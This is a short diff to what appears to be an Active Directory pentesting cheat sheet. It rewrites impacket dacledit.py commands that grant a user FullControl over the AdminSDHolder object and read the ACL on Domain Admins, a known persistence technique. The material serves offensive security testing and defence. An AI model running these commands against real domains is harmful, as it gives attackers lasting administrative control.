@@ -10,11 +10,11 @@
 
 ## Linux
 
-    dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' 'domain'/'user':'password'
+    dacledit.py -action write -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' -principal user1 -rights FullControl -ace-type allowed -dc-ip <DC_IP> 'domain.local'/'administrator':'password'
 
 ### Inspection
 
-    dacledit.py -action 'read' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' 'domain'/'user':'password'
+    dacledit.py -action read -target "Domain Admins" -principal user1 -dc-ip <DC_IP> domain.local/user1:password
 
 ## Windows
 
